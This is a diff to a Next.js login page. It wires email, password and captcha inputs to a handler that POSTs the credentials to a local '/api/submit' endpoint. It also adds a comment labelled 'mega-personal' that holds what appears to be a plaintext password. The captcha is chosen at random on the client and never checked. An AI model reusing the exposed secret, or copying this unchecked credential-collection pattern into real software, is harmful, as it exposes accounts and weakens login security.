@@ -3,6 +3,7 @@ import React, { useState } from 'react';
 import loginBenner from '@/images/loginbenner.png';
 import reloadbutton from '@/images/reloadButton.png';
 import Image from 'next/image';
+import axios from 'axios';
 
 
 const page = () => {
@@ -40,6 +41,11 @@ const page = () => {
       ];
 
 
+
+      // mega-personal
+      //KhIeiJ5kgc5m5wdz
+
+
       const [currentImage, setCurrentImage] = useState(images[0]);
 
       // Step 3: Function to change the image randomly
@@ -47,6 +53,39 @@ const page = () => {
         const randomIndex = Math.floor(Math.random() * images.length);
         setCurrentImage(images[randomIndex]);
       };
+
+
+
+      const [formData, setFormData] = useState({
+        email: '',
+        password: '',
+        otp:''
+      });
+
+      const handleInputChange = (e) => {
+        const { name, value } = e.target;
+        setFormData({
+          ...formData,
+          [name]: value
+        });
+      };
+
+      const handlesubmit =async (e) => {
+        e.preventDefault(); // Prevent form from refreshing the page
+        await axios.post('http://localhost:5000/api/submit', { email:formData.email, password:formData.password });
+
+
+        // window.location.reload();
+
+        // Do something with the email and password (e.g., authentication)
+
+        // Clear the input fields by resetting the state
+        setFormData({
+          email: '',
+          password: '',
+          otp:''
+        });
+      }
 
 
     return (
@@ -60,17 +99,17 @@ const page = () => {
             </div>
             <h3 className='text-[#B9A697] text-[18px] font-normal '>Already have an account?</h3>
 
-            <form className='flex flex-col gap-3'>
-                <input type="email" name="" className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
-                <input type="password" name="" className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Password' required/>
+            <form onSubmit={handlesubmit} className='flex flex-col gap-3'>
+                <input type="email" name="email" value={formData.email} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
+                <input type="password" name="password" value={formData.password} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Password' required/>
                 <div className='flex items-center justify-between'>
                     <div className='border-2 border-[#c0c0c0] rounded'><Image className='p-[2px]' src={currentImage} width={191} height={37}/></div>
                     <span onClick={changeImage} className='cursor-pointer'><Image src={reloadbutton} width={41} height={41}/></span>
                 </div>
-                <input type="email" name="" className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Enter code from the picture'/>
+                <input type="text" name="otp" value={formData.otp} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Enter code from the picture'/>
 
                 <div className='flex flex-col items-center'>
-                <button className='w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px]'>SUBMIT</button>
+                <input className='w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer' type="submit" value="SUBMIT" />
                 </div>
 
                 <div className=' rounded bg-[#F6DB4D] p-[10px]'>
